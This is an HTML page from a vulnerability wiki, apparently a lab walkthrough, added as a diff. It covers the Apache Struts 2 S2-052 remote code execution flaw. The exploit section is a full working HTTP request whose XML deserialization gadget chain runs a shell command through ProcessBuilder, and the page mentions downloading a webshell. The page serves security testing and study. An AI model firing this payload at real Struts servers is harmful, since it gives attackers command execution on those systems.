@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/struts2/s2-052/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>S2-052 Remote Code Execution Vulnerablity - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "S2-052 Remote Code Execution Vulnerablity", url: "#_top", children: [
+              {title: "Setup", url: "#setup" },
+              {title: "Exploit", url: "#exploit" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        S2-052 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../s2-048/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../s2-048/README.zh-cn/" class="btn btn-xs btn-link">
+        S2-048 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="s2-052-remote-code-execution-vulnerablity">S2-052 Remote Code Execution Vulnerablity<a class="headerlink" href="#s2-052-remote-code-execution-vulnerablity" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Affected Version: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p>
+<p>Details:</p>
+<ul>
+<li><a href="http://struts.apache.org/docs/s2-052.html">http://struts.apache.org/docs/s2-052.html</a></li>
+<li><a href="https://yq.aliyun.com/articles/197926">https://yq.aliyun.com/articles/197926</a></li>
+</ul>
+<h2 id="setup">Setup<a class="headerlink" href="#setup" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>After launching the environment, visit <code>http://your-ip:8080/orders.xhtml</code> to see the showcase page. We need modify the <code>orders.xhtml</code> to <code>order.xml</code> or modify the <code>Content-Type</code> header to <code>application/xml</code> to pass the XML data in the body.</p>
+<p>So, the package is:</p>
+<div class="highlight"><pre><span></span><code>POST /orders/3/edit HTTP/1.1
+Host: your-ip:8080
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/xml
+Content-Length: 2415
+
+&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                      &lt;command&gt;
+                        &lt;string&gt;touch&lt;/string&gt;
+                        &lt;string&gt;/tmp/success&lt;/string&gt;
+                      &lt;/command&gt;
+                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                    &lt;/next&gt;
+                  &lt;/iter&gt;
+                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                      &lt;name&gt;start&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                    &lt;name&gt;foo&lt;/name&gt;
+                  &lt;/filter&gt;
+                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre></div>
+<p>If the packet is executed, the file <code>/tmp/success</code> will be created in the docker container. We execute <code>docker compose exec struts2 ls /tmp/</code>, and we can see <code>success</code>.</p>
+<p>In addition, we can also download a jspx webshell:</p>
+<p><img alt="" src="01.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        S2-052 远程代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../s2-048/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../s2-048/README.zh-cn/" class="btn btn-xs btn-link">
+        S2-048 远程代码执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
